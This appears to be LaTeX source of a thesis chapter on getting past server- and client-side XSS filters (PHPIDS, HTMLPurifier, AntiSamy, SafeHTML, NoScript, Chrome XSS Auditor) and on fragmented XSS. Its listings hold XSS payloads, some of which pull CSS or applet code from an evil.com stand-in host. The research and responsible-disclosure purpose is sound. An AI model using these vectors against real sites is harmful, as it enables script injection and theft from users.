+    Data URIs on Gecko-based browsers possess similar risk potential. Unlike other user agents, a data URI loaded and initiated by a redirect will execute JavaScript on the domain the redirect occurred on. Furthermore, several web-servers will allow pseudo-redirection to data URIs, contrary to JavaScript URIs. This allows an attacker to utilize data URIs for exploitation -- even if they should execute in the context of \textit{about:blank} and therefore contain the DOM they generate and use from the originating DOM via SOP. Having a data URI execute in the scope of \textit{about:blank} instead would not allow exposure of sensitive properties of the formerly loaded domain. Data URIs therefore mark a weak point in the Gecko and Firefox SOP. A ticket was created by J. Ruderman to point out this exclusive source for XSS attacks via data URI in Gecko browsers -- but didn't yield sufficiently positive feedback from the Mozilla developers~\footnote{Ruderman, J., \textit{Prevent data: URLs from being used for XSS}, \url{https://bugzilla.mozilla.org/show_bug.cgi?id=255107} (Aug 2004)}. A fix is not to expect -- therefore allowing attackers to further make use of this SOP weakness. Note that for both of the aforementioned cases, the about: scheme problem as well as the data: URI XSS potential the SOP is clearly violated once the attack would be initiated from a HTTP of FTP URL.\\
+
+    Aside from the example use cases, modern browser provide more interfaces allowing solicited and sometimes unsolicited SOP weak-spots and bypasses. One technology worth mentioning is the novel cross-domain capability for the \textit{XMLHttpRequest} object -- or the similarly functioning \textit{XDomainRequest} object for Internet Explorer~\footnote{MSDN, \textit{XDomainRequest Object}, \url{http://msdn.microsoft.com/en-us/library/cc288060(v=vs.85).aspx} (Dec 2011)}. A developer can add a set of headers to a web document specifying, which domain would be allowed to access its contents. Sadly, many web-servers have set those headers to a wild-card option, literally allowing any other website to access their contents~\footnote{ShodanHQ, \textit{Search Results for Access-Control-Allow-Origin:+*}, \url{http://www.shodanhq.com/search?q=Access-Control-Allow-Origin:+*} (Oct 2011)}. Similar mechanisms are allowed for cross domain images -- and other resources that can be applied with a crossdomain attribute (Cross 
+Origin resource Sharing, CORS)~\footnote{MDN, \textit{HTTP Access Control}, \url{https://developer.mozilla.org/En/HTTP_access_control} (Dec 2011)}. The cross-domain communication for Iframes has been approached via the \textit{postMessage API} -- here the message recipient can check for the requesting domain and decide, if the message should be processed or dropped~\footnote{MDN, \textit{window.postMessage}, \url{https://developer.mozilla.org/en/DOM/window.postMessage} (Dec 2011)}. Zarandioon et al. presented OMOS in 2008; it is a framework desired to deliver secure mash-up design based on the \textit{postMessage} API~\cite{zarandioon2008omos}. Those explicit interfaces were mainly created to allow developers to enable cross-domain communication in a controlled and comprehensible manner without relying on browser quirks and bugs to create more interactive and communicative applications. Decat et al. detail on those technologies and APIs in their article published in 2010~\cite{decat2010towards}. Nevertheless 
+modern user agents still supply a significant amount of unintended SOP weaknesses -- often even introduced by plug-ins such as Java as elaborated on in Section~\ref{subsubsubsec:2.4.3.2.java_plugin_security}.
+        
+
+    \subsection{Bypassing Server Side XSS Protection}
+    \label{subsubsec:5.4.6.bypassing_server_side_xss_protection}
+
+      The following sections will document our past research investigating server-side XSS filters with the goal of finding bypasses based on in-browser behavior mismatches and overly tolerant parsing. Server-side XSS protection libraries exist for many run-times and can usually look back on the years of development and maturing against more and more exotic XSS variations and bypass attempts. Several of the mentioned products are available as open source software, facilitating the analysis. This is for example the case for the HTMLPurifier (composed in PHP) and PHPIDS, while others can only be tested with black-box techniques, such as for example SafeHTML. Subsequent sections will elaborate on more generic and library independent ways of bypassing server-side XSS protection, such as that via Fragmented XSS in Section~\ref{subsubsubsec:5.4.6.4.fragmented_xss}. The main goal of the following parts is to outline and underline the importance of a security tool that is not solely running on the server. That is 
+because those tools can easily be bypassed as soon as an attacker discovers browser functionality suitable for carrying out an attack, which is not yet registered as ``known-bad'' with the server-side library. 
+    
+      \subsubsection{Bypasing PHPIDS}
+      \label{subsubsubsec:5.4.6.1.bypassing_phpids}
+
+      The PHPIDS is a free of context server-side PHP-based intrusion detection system, which is granting a developer the possibility to use an application layer library to inspect incoming user generated data before hitting the actual (web)application. We initiated the project in 2007, aiming towards creation of a simple to use yet effective and free as well as open sourced IDS project designed to monitor the attack surface of PHP applications~\footnote{Heiderich, M., \textit{WebApp IDS}, \url{http://sla.ckers.org/forum/read.php?12,30425} (March 2007)}. The approach used by the PHPIDS for telling apart benign and potentially malicious user generated content can be split into three two major parts. The first part solely relies on normalizing the incoming string data and sending it to a collection of regular expressions. The more of these regular expressions match the inspected string, the higher the internal score for grading the possible severity of the attack will be raised, thus allowing the developer to 
+ultimately decide if the string should be truncated, nulled or encoded. The second part is called ``centrifuge'' and it is based on a proprietary analysis approach taking away several character classes, normalizing groups of special chars to be represented by certain placeholders and ultimately matching the remaining string fragment against a single regular expression. Hence, it can be decided if an additional attack score is being applied or not. The centrifuge is meant to be able to detect novel attacks that cannot be caught by the existing regular expression-based filter rules relying on the assumption that most attacks against web applications require a decent set and ratio of specials characters such as parenthesis and similar syntactical references.\\
+
+      Despite constant maintenance, especially the phase directly after publication of the \mbox{PHPIDS}, the system was haunted by numerous bypasses and minor implementation flaws. Over time, the system maintainers were capable of adjusting filter rules and the quality of the string normalization as well as the centrifuge though, making bypasses become harder to accomplish. Contrary to other IDS systems, the PHPIDS attempts to detect executable code inside strings injected into script blocks. Usually a WAF or IDS only needs to scan for sub-strings indicating a SQL injection, remote code execution attempts, or, in case of XSS and the scope of this thesis, the injection of arbitrary active HTML or CSS. The extension of the detection scope of the PHPIDS demanded a larger rule-set and initially caused many bypasses to be reported and fixes to be made to normalization algorithm and filter rules. The outcome of these developments was a steep learning curve in terms of XSS filter bypass techniques. Several of the 
+voluntary PHPIDS testers spend many man-months testing the rules, and later submitted the bypasses and results of their findings. Over the course of four years period, the PHPIDS became very aware of even the quirky XSS filter bypass attempts and managed to detect them. At the same time, they were making change sets and bypasses publicly available; thus, helping the security community sharpen their skills pertaining to filter bypasses as well as distributing knowledge about novel scripting and injection techniques. Eventually the normalization algorithm, as well as the centrifuge and the default rule-set were adopted by \textit{mod\_security}; it is a rather well-known and widely distributed IDS/IPS used by many high-traffic websites~\footnote{ModSecurity, \textit{ModSecurity Demonstration Projects}, \url{http://www.modsecurity.org/demo/index.html} (Dec 2011)}.\\
+
+      While the last fully working XSS filter bypass against the PHPIDS has been reported in July 2011, the fragility of the protection based on the detection performance of the PHPIDS is obvious. Since the filter rules can only detect the already ``known bad'' - scripting and injection techniques that are already documented, the protection against 0-day attacks delivered by the centrifuge is rather easy to bypass. Brooks published a paper intended for Defcon 19 in 2011, describing several bypass techniques working against PHPIDS 0.6.5~\footnote{Brooks, M., \textit{Bypassing PHPIDS 0.6.5}, \url{https://sitewat.ch/files/Bypassing\%20PHPIDS\%200.6.5.pdf} (Aug 2011)}. As every other server-side protection mechanism, the PHPIDS lack insight into the set of capabilities the user agents possess. Protecting a web application from client-side attacks with a server-side tool requires a utilization of several assumptions; those include the user-agent capabilities correlated to the potentially malicious character of 
+those -- combined with a set of de-obfuscation functions. Only this can lead to a delivery of correct matching results. Especially with the quickly growing feature-set caused by the current HTML specification being a living standard, systems like the PHPIDS can hardly compete with the attackers' toolboxes and would require constant maintenance. Consequently, thorough and constant browser security research to deliver the promised detection and protection results needs to be aspired to. While some of the HTML5-based attack vectors have already been adopted by the default rules, several of the newly discovered ones have not yet been addressed and provide additional canvas for attackers to design novel bypasses.
+
+      \subsubsection{Bypassing HTMLPurifier}
+      \label{subsubsubsec:5.4.6.2.bypassing_htmlpurifier}
+
+      The HTMLPurifer is a PHP library written by Yang and initiated in August 2006 upon the release of 1.0.0beta. The library is still being well maintained and continuously optimized. Therefore it fulfills a basic yet complicated task: The transformation of arbitrary untrusted and potentially unstructured and malicious markup into safe, well-formed and doctype-validated (X)HTML. The HTMLPurifier allows sanitation of style tags and attributes as well. While style attributes are being validated by the HTMLPurifier core functionality, style tags are handled by the external library CSSTidy. This software has not been maintained since late July 2007. The HTMLPurifier does not allow style elements by default - a user has to enable them to be subjects of sanitation rather than having them stripped entirely by a configuration setting. Style attributes are nevertheless permitted by default. \\
+
+      The HTMLPurifier allows a heavy custom configuration, often greatly affecting the resulting output of the purification process. Many elements causing non-user agent HTML parsers to generate confusing or faulty and even insecure output are disabled by default. This means that they will not be added to the sanitized DOM tree and the resulting output string. In case a website using HTMLPurifier allows usage of style tags, an attacker needs to bypass this specific library exclusively and will not have to bother with bypassing the HTMLPurifier filtering and sanitation logic. The code snippets in Listing~\ref{lst:csstidy-bypass} depict two bypasses of the CSSTidy library giving an attacker possibilities to inject an \textit{@import} directive to pull arbitrary malicious CSS -- containing for instance absolute positioning to overlap existing HTML elements, introduce dynamic expressions and case an XSS attack or inject \textit{-o-link} properties to facilitate a Clickjacking attack on Opera browsers. \\
+
+\begin{lstlisting}[label=lst:csstidy-bypass,caption=Examples for potential XSS vectors bypassing CSSTidy; note the URL encoding, which is necessary to allow MSIE to use data URIs in CSS,captionpos=b]
+<!-- Bypass I: Malformed attribute selectors -->
+<style>
+*.foo:bar['abc}{}@import"data:\2c%2a%7bx:expression(alert(1))%7d";def']{
+color:red;}</style>
+
+<!-- Bypass II: Closing curly allowing @-rule injections -->
+<style>}
+@charset "UTF-7"; @import "https://heideri.ch/jso/test.css";
+*{color: rgb(0,0,0);}</style>
+\end{lstlisting}
+
+      Other than the aforementioned problems of HTMLPurifier in combination with CSS-\\
+Tidy, the HTMLPurifier library is considered to be a very strong barrier between an attacker and a successful payload delivery. One of the reasons behind this is the fact that HTMLPurifier does not actually sanitize incoming data. Instead it analyzes and builds it up to the point of possibly attaining a whole new XMLDOM tree based on the chosen DTD representing the incoming data, yet not containing any substring of it. This makes it very difficult for an attacker to smuggle string fragments past the filtering routines, simply because nothing of the input is being used in the actual output. The HTMLPurifier tokenizes the incoming data and makes sure that firstly, a structurally valid DOM tree is being built and a well-formed, and secondly that a consequently valid HTML output string is being generated from it. The option of using character encoding tricks and malicious substrings inside the user-supplied markup is therefore minimal. Comparable filtering solutions, such as HTMLawed for instance, have 
+frequently been bypassed with string-based obfuscation tricks, while HTMLPurifier resisted most circumvention attempts. \\
+
+      Still, as this thesis' main focus is on the futility of server-side user-input filtering and sanitation, the flaws we found during our research with HTMLPurifier should be mentioned and discussed. First and foremost, the purely client-side attacks can by no means be detected by the PHP based HTMLPurifier. In case none of the malicious data is being sent to and received by the server, a server-side tool is left unable to see or filter this data. The whole range of DOMXSS sub-classes, as being described in Section~\ref{subsubsec:5.4.4.domxss}, applies to this method of bypass. However, in its defense, this case neither is nor can be in scope for the HTMLPurifier.\\
+
+      The attacks described in Section~\ref{subsubsec:5.4.8.attacks_using_innerhtml} and Section~\ref{subsubsec:5.4.9.attacks_using_csstext} - prove much more intriguing and interesting, since the malicious input is being sent to the server but will appear to be harmless and properly encoded until used by the client. Same goes for attacks abusing user agent-based parser errors. We detected and reported several such bugs present in modern browsers to appropriate vendors and the author of the HTMLPurifier. This has led to instant fixes and a Microsoft Security Bulletin in October 2010 (MS-10-071, MS-10-072). The code snippets in Listing~\ref{lst:bypassing-htmlpuifier} demonstrate the discoveries - bypasses and injection vectors, while the following paragraph will elaborate on their whereabouts. \\
+
+\begin{lstlisting}[label=lst:bypassing-htmlpuifier,caption=Example-bypasses for the HTMLPurifier; note the exclamation mark and the CSS escapes confusing the parser and adding additional obfuscation,captionpos=b]
+<!-- first bypass - based on a IE8 parser bug -->
+<a style="background:url('/\'\,!@x:expression\
+  (write\(1\)\)//\)!\'');"></a>
+
+<!-- second bypass - based on innerHTML decompliation -->
+<div style="font-family:sans\22 \3B x:
+  expression\28 alert\28 2\29 \29 \3B ) \3B "></div>
+\end{lstlisting}
+ 
+      The first bypass we showcased is based on a severe parser bug haunting Internet Explorer 8. In reaction to our finding and responsible disclosure, the problem has been fixed in October 2010. The HTMLPurifier filter rules acted correctly and assumed the data passed to the \textit{url()} function for the CSS background property to be properly escaped. Internet Explorer 8 nevertheless assumes the exclamation mark with following non-word character to be a token capable of ending the the background property. It is believed to be the problem related to improper handling of \textit{!important} directives. Without knowing about this parser quirk, the server-side XSS filter has no chance of realizing an injection has taken place and sanitation was successfully bypassed. \\
+
+      The second example utilizes an internal browser behavior active in many modern versions of Internet Explorer, older versions of Google Chrome and Firefox 3 alike. Again, a style attribute introduces a vector and consequently an XSS exploit. This time nevertheless, unlike in the first example, no parser bug is being exploited but a generally existing and known performance optimizing feature used on \textit{innerHTML} property access weaponizes the code instead. The detailed operative traits of this attack are discussed in Section~\ref{subsubsec:5.4.8.attacks_using_innerhtml} and Section~\ref{subsubsec:5.4.9.attacks_using_csstext}. Again, the server-side filter would have to had known about the different peculiarities of several browsers in order to provide effective protection mechanisms against bypassing attack vectors. To detect all related attack vectors, the HTMLPurifier would have to provide a full stack emulation layer of any targeted user agent, which must be considered a difficult, if not 
+impossible, task.\\
+
+      \subsubsection{Bypassing AntiSamy}
+      \label{subsubsec:bypassing_anti_samy}
+
+      AntiSamy, a XSS filtering tool created by Li and Dabirsiaghi, is composed in Java and meant to be used in Tomcat, J2EE-driven and comparable environments~\footnote{Dabirsiaghi, A., \textit{OWASP AntiSamy Project}, \url{http://code.google.com/p/owaspantisamy/} (Dec 2011)}. It can be seen as the Java-counterpart of the HTMLPurifier and has proven difficult to bypass during our tests. AntiSamy allows a developer to choose from two different XML parsers -- SAX and DOM to disassemble the incoming markup strings and build a DOM tree representation to inspect for the presence of possibly active markup. The AntiSamy filtering and sanitation capabilities can be configured with an XML file; several default files are already being shipped for demonstration purposes. During our research, in spite of AntiSamy being extremely strict, we have managed to uncover one bypass working in combination with the \textit{innerHTML}-related attacks mentioned in Section~\ref{subsubsec:5.4.8.attacks_using_innerhtml}, which are 
+identified as working against Internet Explorer 8. The code shown in Listing~\ref{lst:bypassing-antisamy} demonstrates the bypass and shows the resulting markup, qualified to load a behavior file and execute its content.
+
+\begin{lstlisting}[label=lst:bypassing-antisamy,caption=Bypassing AntiSamy with innerHTML; automatic decoding by the user agent layout engine renders the harmless string to be malicious,captionpos=b]
+IN: 
+  <p style="color:red;background:url(
+  /abcdef\29\3b\2dms\00002dbehavior\3aurl\28\000023
+  default\23time2\29\3b\2f\2a)">123456</p>
+
+OUT: 
+  <p style="color: red;background: url(
+  /abcdef\29\3b\2dms\00002dbehavior\3aurl\28\000023
+  default\23time2\29\3b\2f\2a);">
+
+IE8 (standards mode) innerHTML: 
+  <P style="BACKGROUND: url(
+  /abcdef);-ms-behavior:url(#default#time2);/*); COLOR: red">123456</P> 
+
+\end{lstlisting}
+
+      Apart from few implementation and default configuration, some additional flaws were discovered. Among those we can name low priority problems such as forms that were allowed to be wrapped in links identified by us, as well as open textarea and form tag problems spotted by Heyes~\footnote{Dabirsiaghi, A., \textit{AntiSamy 1.1.1 released today!}, \url{http://i8jesus.com/?p=19} (April 2008)}. \\
+
+      A different bypass was found in by Kirchner et al., who in this particular case has made use of a faulty grammar check for XML CDATA sections, which were fixed in version 1.4.2 of the AntiSamy library~\footnote{Dabirsiaghi, A., \textit{AntiSamy 1.4.2 released}, \url{http://i8jesus.com/?p=255} (Dec 2010)}. Of all the filter systems we have tested during our research, AntiSamy was the most restrictive and therefore hardest to bypass. The developers decided for maximum security regarding the composition of the default configuration files. A web developer using AntiSamy can nonetheless choose to weaken those restrictions and thereby regress the default security provided by this tool. 
+
+      \subsubsection{Bypassing SafeHTML}
+      \label{subsubsubsec:5.4.6.3.bypassing_safehtml}
+
+      SafeHTML is a library being used by many Microsoft products, including server- and client-side components. Web applications, such as Hotmail, use SafeHTML as well as Internet Explorer with the \textit{toStaticHTML} DOM implementation. Depending on the set of parameters SafeHTML received, the filter allows and prohibits different markup fragments tags and attributes to pass. Some applications should not allow external links pointing to cross domain resources, others can permit these but must make sure images are being proxied or similar. In the context of this thesis, the most interesting use cases for SafeHTML are the server-side implementations for applications like Hotmail and SharePoint. Our testing has generated several bypasses, which we have then reported to Microsoft and have since seen them included in bulletin level security bugs. Two of these examples will be introduced in paragraphs to follow.\\
+
+      The first bypass working against SafeHTML has succeeded because of a parsing bug related to CSS style attributes in Internet Explorer 8. The exclamation mark character (U+0021) could be used to trick the parser into assuming that a string parameter and its surrounding function has been prematurely ceased. Sample code for this bug is presented in Listing~\ref{lst:bypassing-htmlpuifier} in Section~\ref{subsubsubsec:5.4.6.2.bypassing_htmlpurifier}. \\
+      The second of the uncovered bypasses was again pertaining to style-sheets but this time it was an outcome of improper handling of special characters inside attribute selectors. CSS parsers are by design known and required to be tolerant. The reason for that is an emphasis on extensibility and flexibility. In case a CSS parser stumbles upon data that is deemed unable to comprehend, it is required to consider this data as ``garbage'' and keep on looking for the next known element to parse and process~\footnote{Romanato, G., \textit{CSS syntax}, \url{http://www.css-zibaldone.com/articles/syntax/css-syntax.html#parsing-errors} (Sep 2010)}. The smallest possible but complete element structure for a CSS parser is a pair of curly brackets -- an opening and a closing curly bracket (U+007B, U+007D). Once the parser reaches such a combination, it usually assumes to have found a fully valid yet empty CSS selector block. In some cases, the data surrounding this pair of curled braces, regardless of its potential 
+validity, will then be considered as garbage and ignored. The SafeHTML bypass essentially used this feature embedded in a CSS2 attribute selector. The attack vector we have developed, as shown in Listing~\ref{lst:import-via-curlies}, used two additional features available in Internet Explorer to execute arbitrary JavaScript: CSS dynamic expressions and the possibility to import an external style-sheet not only at the beginning of the file but anywhere in the style-sheet. 
+
+\begin{lstlisting}[label=lst:import-via-curlies,caption=Bypassing SafeHTML via curlies in attribute selectors; enabling an import of malicious CSS data from a different origin,captionpos=b]
+<style type="text/css">
+ a[foo=b{}@import//evil.com/evil.css? /*ar]{color:red;}
+</style>
+\end{lstlisting}
+
+      Later investigations identified many other user agents as vulnerable against curly bracket injections into attribute selectors and other parts of the CSS grammar. Opera browsers, as well as Gecko-based user agents, allowed injection of attribute selectors into property values, which equals initiation of similar attacks against CSS and HTML filter software~\footnote{Heiderich, M. et al., \textit{CSS-based XSS vectors}, \url{http://html5sec.org/?\{\}#css} (2011)}. Similar bypasses have been found against HTMLPurifier, as documentation in Section~\ref{subsubsubsec:5.4.6.2.bypassing_htmlpurifier} ascertains.\\
+
+      The quintessence of this bypasses can be outlined in the following terms: Even if a filter library follows the grammatical laws given by the specification, bypasses cannot be hindered from occurring. The glitches existing in user agent parser engines force an effective filter library to adjust and adopt knowledge about the user agents they serve. Given the many differences between major and minor versions of CSS directives (especially Opera deployed many different ways of handling \textit{-o-link}) server-side filters will either have to boil down white-listed CSS grammar to a small and seemingly harmless subset or learn about the user agent glitches and extend their rule-sets accordingly. 
+
+    \subsection{Fragmented XSS}
+    \label{subsubsubsec:5.4.6.4.fragmented_xss}
+
+      Fragmented XSS poses a serious challenge for both server- and client-side filtering mechanisms. As soon as an attacker can control more than one parameter, it becomes easy to fragment the attack trigger and payload into small packages of which every single one is hard to detect and filter. Consider the following code snippet in Listing~\ref{lst:fragmented-example-1} to be an illustrative example of this problem. \\
+
+\begin{lstlisting}[label=lst:fragmented-example-1,caption=A example website using three parameters; no malicious parameters are being injected,captionpos=b]
+URL: example.com/insecure.php?a=123&b=456&c=789
+
+Result:
+<body>
+<p>Parameter A: 123</p>
+<p>Parameter B: 456</p>
+<input name="Parameter-C" type="text" value="789">
+</body>
+\end{lstlisting}
+
+      Based on the aforementioned input and with an assuming that none of the three parameter values are escaped nor encoded properly, an attacker can now proceed and inject three fragments of attack code. A possible injection and the resulting markup are being depicted in Listing~\ref{lst:fragmented-example-2}.
+
+\begin{lstlisting}[label=lst:fragmented-example-2,caption=A example website using three parameters; three malicious parameters are being injected -- initiating a fragmented XSS attack,captionpos=b]
+URL: example.com/insecure.php?a=<img/src='&b='onerror='/*&c=*/alert(1)'
+
+Result:
+<body>
+<p>Parameter A: <img/src='</p>
+<p>Parameter B: 'onerror='/*456</p>
+<input name="Parameter-C" type="text" value="*/alert(1)'">
+</body>
+\end{lstlisting}
+
+      Either server- or client-side input filter would have to judge on the potential malice of just three fragments instead of a full vector. These fragments are \texttt{<img/src='}, \texttt{'onerror='/*} and \texttt{*/alert(1)'} -- neither of them directly indicates an attack with included payload execution. Some intrusion detection systems, such as the PHPIDS, have fine-grained filter checks and detect all three parameters as possible attacks. The current version of the Chrome XSS filter, NoScript and Internet Explorer XSS filter detect and quantify the exemplary parameters as an attack. Thus, they prohibit the attacker from executing arbitrary JavaScript code. Nevertheless, even a simple variation of the attack will lead to a full stack bypass, as can be seen in Listing~\ref{lst:fragmented-example-3}.\\
+
+\begin{lstlisting}[label=lst:fragmented-example-3,caption=Bypassing the Internet Explorer 9 XSS filter,captionpos=b]
+URL: example.com/insecure2.php?a=><img/src=`x &b=x` %0Conerror=alert(1)%20
+
+Result:
+<body>
+<input type=text value=><img/src=`x >
+<input type=text value=x` 
+onerror=alert(1) >
+</body>
+\end{lstlisting}
+
+      This above-presented bypass utilized the fact that back-ticks (U+0060) are valid attribute delimiters and slip past the filter's rules. In addition, the form-feed character (U+000C) helps to obfuscate the vector and bypass the XSS filter. In late 2011, Nikiforakis published his research on fragmented XSS and outlined a bypass working on most recent versions of the Google Chrome browser~\cite{nikiforakis_bypassing_2011}. 
+
+      Detecting fragmented XSS with static filters and regular expressions is a question of ``where to draw the line'' determination. Theoretically, a filter can take the values of each parameter and marry them in all possible combinations. An overall of three parameters would result in variation count \textit{V} of $V_3 = 3! = 6$ possible combinations to check against and confirm their existence in the rendered markup. Correspondingly, applying this precept to nine parameters would bring the count to $V_9 = 9! = 362.880$, based on the formula $n! = n*(n-1)!$. An operation demanding a check on \textit{362.880} permutations of arbitrary length to be verified against occurrence in a string of again arbitrary length and character entropy must cause enormous CPU load for the parent process and usually results in a denial of service (DoS) attack. By design, in case a server- or browser-side XSS filter decides to support checks for fragmented XSS, a new attack pattern emerges in a form of easy to abuse 'denial of 
+service' type of vulnerabilities. \\
+
+      The PHPIDS utilizes carefully adjusted filter rules to detect possibly malicious code in single parameters rather than aiming to check against all possible permutations. Nevertheless, sophisticated fragmented attacks are very likely to bypass the detection rules without any risk of being detected as such. \\
+
+    \subsection{Bypassing Client-Side XSS Protection}
+    \label{subsubsec:5.4.7.bypassing_client_side_xss_protection}
+
+      After revisiting server-side XSS filters and discussion bypasses, the ensuing sections will be dedicated to client-side XSS protection mechanisms. They will also tackle a question of how bypasses against the mechanisms in question can be designed and carried out. The interesting aspect of bypassing client-side filters lies on the assumption that visibility and knowledge problems hindering server-side filters from being able to work properly do not exist. The filter is working as part of the user agent itself, or at least in a form of a browser extension. It is thus capable of executing scripting code with higher privileges. Our research has shown that client-side XSS filters are particularly prone to bypasses and attacks utilizing the filter to carry out an attack by modifying the attack vector and thereby ``weaponizing'' the XSS filter itself. Due to the presence of sufficient academic~\cite{bates2010regular} and non-academic research coverage in the past~\footnote{Vela, E., et al., \textit{Abusing 
+Internet Explorer 8's XSS Filters}, \url{http://p42.us/ie8xss/Abusing_IE8s_XSS_Filters.pdf} (Aug 2008)}, we will omit the argument on the Internet Explorer 8 XSS filter bug causing immune websites to be vulnerable because of its substantial implementation flaw. 
+    
+      \subsubsection{Bypassing NoScript}
+      \label{5.4.7.1.bypassing_noscript}
+      
+      The NoScript extension is a well-distributed and powerful tool written and designed by Giorgio Maone. NoScript essentially provides a way of white-listing domains allowed to load JavaScript, Flash, and similar active content. Furthermore, it provides a string reflected XSS filter and several other security tools attempting to protect users' privacy and security during Firefox-assisted website browsing. In the bargain, NoScript adds a DOM method to the global scope called \textit{toStaticHTML}. This non-standard method has been designed by Microsoft and first deployed in Internet Explorer 8. The implementation used by Microsoft and the one added by NoScript operate under the common goal auspices, but deliver different results in regards to filtering and filter results. NoScript employs Firefox internals to fuel the \textit{toStaticHTML} implementation, while Internet Explorer relies on a customized SafeHTML implementation -- as described in Section~\ref{subsubsubsec:5.4.6.3.bypassing_safehtml}.\\
+
+      At present, Firefox and other Gecko-based user agents are not supplied with a native XSS filter; therefore NoScript is the only regularly maintained and noteworthy possibility of adding thorough reflected XSS detection and prevention to Firefox and related user agents. Similar to other approaches, such as the Internet Explorer XSS filter and the Webkit XSS Auditor, the NoScript filter component examines the URI of the website load and matches fragments of the URI against internal set of filter rules. Note that in comparison to other filters, it requires no matching between site content, URI fragments and internal blacklist. NoScript solely examines the URL and does not rest on data being reflected by the content of the rendered document. This means that there are positive and negative consequences. On a plus side, there is a lack of attack levers utilizing differences between the data used in the URL and the data rendered in the actual website. Section~\ref{5.4.7.2.bypassing_chrome_xss_auditor} will 
+elaborate on vulnerabilities caused by discrepancies between those data sources and sinks. A chance for a larger number of false alerts is a downside of this one-factor matching. The NoScript change-log shows several of those, all reported by the users and fixed soon after by the NoScript author Maone.
+
+      During our examination of NoScript XSS filter and the related \textit{toStaticHTML} method, we managed to find three different bypass techniques, which will be delineated in the list below.
+      
+      \begin{itemize}
+	%
+       \item \textbf{HTML5 named character references} The HTML5 specification requires user agents to support a large set of newly named entities. Among them, several named references for ASCII characters appeared. For HTML4 only a small set of ASCII characters had corresponding named entities, some examples including ampersand, double-quote, greater-than, lesser-than and single-quote. With HTML5 characters such as colon or semi-colon as well as parenthesis can be represented as named entities as well. Upon combining this knowledge with the possibility to use entities inside HTML element attributes, the bypass could be crafted. While Firefox already supported the new entities, NoScript had not implemented them on its XSS blacklist. Thus, the following code slipped through the NoScript XSS detection filters unseen and without raising an alert notification or indicating content altering: \texttt{<a href="javascript\&colon;alert\&lpar;location\&rpar;">CLICKME</a>}. The bypass has been reported and fixed in the 
+more recent versions.
+	%
+       \item \textbf{Whitespace in Data URIs} Firefox will ignore single whitespace characters in data URIs. This means a data URI can be completely obfuscated through a placement of whitespace characters, such as U+0020, before any other character. While Firefox would have still been able to parse the data by ignoring the whitespace, the NoScript XSS filter was not aware of this behavior and did not trigger a match. Ergo, the following attack vector managed to bypass the detection rules and resulted in a filer bypass executing JavaScript. It is noteworthy that despite the usage of a data URI, JavaScript would still execute in the context of the referring domain. This remains to be an unusual but still existing Firefox behavior: \texttt{<a href="data:x,<b> < s \&\#10 c r i p t>alert(1) < /s \&\#10 c r i p t>">CLICKME</a>}. As in the former case, the bypass has been reported and accordingly fixed in recent versions.
+	%
+       \item \textbf{Invalid entities bypassing toStaticHTML} During our research into breaking of the protective promises of the \textit{toStaticHTML} functionality delivered by the implementation provided by NoScript, we have discovered a possibility to bypass \textit{toStaticHTML} by using broken entities. Once an entity is incomplete or contains garbage data, the parser seems to ignore it and deliver working markup without the broken entity. Withal, the filtering routine appears to analyze the string including the broken character reference and consequently it does not find match with the filter rules and lets the vectors pass as well. This causes a working bypass -- an example vector would be: \texttt{<a href="javascript\&\#xHELLO:alert(1)" ">CLICK</a>}. The vulnerability has been reported to the author of the NoScript extension and has been fixed successfully. 
+      \end{itemize}
+
+      At the time of this write-up, the NoScript plug-in has reached the version number 2.2.2 and contains fixes against an overall of six vulnerability reports and bypasses submitted during our research phase starting with version 1.9.6.4. It also contains filter bypass based on the JAR protocol handler available in Gecko-based user agents~\footnote{Petkov, P., \textit{Web Mayhem: Firefox’s JAR: Protocol issues}, \url{http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/} (Nov 2007)}; however they are irrelevant in the context of this thesis.
+
+      \subsubsection{Bypassing Webkit/Google Chrome XSS Auditor}
+      \label{5.4.7.2.bypassing_chrome_xss_auditor}
+
+      Aside from the bypasses aforementioned in Section~\ref{subsubsubsec:5.4.6.4.fragmented_xss}, the Chrome XSS Auditor has gone a long way in the last months and years. This was possible thanks to reception of filter updates and constant testing reports from the security community. Still, compared to the detection rate or the NoScript and Internet Explorer 8,9 and 10 XSS filters, this implementation appears to be rather immature at this time. The workings of the Chrome XSS filter in early stages essentially manifested several major problems. 
+
+      Our research unveiled first bypasses in a very early implementation in September 2009. They pertained to the abusing of the matching between URL and website content by introducing characters from a character set to the address bar/linking page, which could not have been displayed properly on the target page. To supplement an illustration: If encoded in ISO-8859-1, the German umlaut \textit{ä} passed from a UTF-8 encoded website would be displayed as multi-byte representation on the target page. To finalize, the vector shown in Listing~\ref{lst:chrome-bypasses-1} formed a successful filter bypass. 
+
+\begin{lstlisting}[label=lst:chrome-bypasses-1,caption=Example bypasses for the Chrome XSS Auditor; both are using encoding tricks to bypass the filter rules,captionpos=b]
+<!-- Bypass I: Using German umlauts -->
+<img src=%e4 onerror=alert('%e4')>
+
+<!-- Bypass II: Control-Characters and self-closing script tags -->
+"><script src= data:%01;base64,YWxlcnQoMSkNCg== />
+\end{lstlisting}
+
+      A second bypass we discovered in 2010 made use of ASCII control characters and data URIs as source for \textit{script} tags. On this matter, Webkit browsers used to correct self-closing script tags internally before being rendered for compatibility reasons -- helping the payload in the vector execute. The differences between data in the address bar and data rendered on the website allowing bypasses, and differences in parsing and displaying control characters between address bar and rendered markup~\footnote{Barth, A. et al., \textit{XSSAuditor bypasses from sla.ckers.org}, \url{https://bugs.webkit.org/show_bug.cgi?id=29278} (Sept 2009)}. While the filter rules did not match the obfuscated vector using the SOH (U+0001 Start of Heading) character, the renderer allowed it as a valid character to separate data URI protocol handler and content separator to later execute the payload without a risk of a filter blocking it.\\
+
+      A third problem in the filter was discovered by us in early 2011. This time it was a question of rendering of \textit{applet} tags and their parameters. Here the Chrome browser removed some parts of the passed code and thereby had the filter trigger and report an attack whilst still executing the payload. \\
+
+      The code shown in Listing~\ref{lst:chrome-bypasses-2} highlights the technique for bypassing Chrome/Chro-\\
+mium XSS filter. For the demonstration purposes, the full URL of code injection is shown, \textit{example.com} and the GET parameter \textit{xss} are brought into play. \\
+
+\begin{lstlisting}[label=lst:chrome-bypasses-2,caption=Java-based example bypass for the Chrome XSS Auditor; stripping the code attribute value enables the param element to step in instead,captionpos=b]
+// URL with malicious parameter 
+http://example.com/vulnerable.aspx?xss=<APPLET code=x> 
+  <param name=codebase value=http://evil.com/applet> 
+  <param name=code value="ArcTest.class"> 
+</APPLET> 
+
+// Resulting markup on the attack website 
+<applet code> 
+  <param name="codebase" value="http://evil.com/applet"> 
+  <param name="code" value="ArcTest.class"> 
